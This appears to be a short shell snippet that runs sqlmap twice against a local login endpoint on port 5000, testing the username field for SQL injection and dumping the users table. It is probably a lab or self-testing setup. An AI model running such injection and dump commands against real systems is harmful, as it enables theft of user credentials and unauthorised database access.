sqlmap -u "http://0.0.0.0:5000/login" --data="username=test&password=123" -p username -T users --dump 
echo "err"
sqlmap -u "http://127.0.0.1:5000/login" --data="username=test&password=123" -p username -T users --dump 
